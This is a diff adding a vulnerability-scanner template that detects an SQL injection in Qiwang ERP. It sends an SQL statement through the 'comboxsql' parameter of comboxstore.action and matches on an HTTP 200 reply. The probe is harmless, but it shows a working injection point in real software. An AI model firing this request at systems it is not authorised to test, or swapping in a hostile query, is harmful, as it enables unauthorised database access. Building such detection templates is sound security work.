@@ -1,0 +1,22 @@
+id: poc-yaml-qiwang-erp-sql-injection
+
+info:
+  name: poc-yaml-qiwang-erp-sql-injection
+  author: kzaopa(https://github.com/kzaopa)
+  severity: high
+  tags: xray-converted,sqli,ct-479107
+
+http:
+  - raw:
+      - |
+        POST /mainFunctions/comboxstore.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        comboxsql=select HashBytes('MD5', '{{rand_base(8)}}')
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
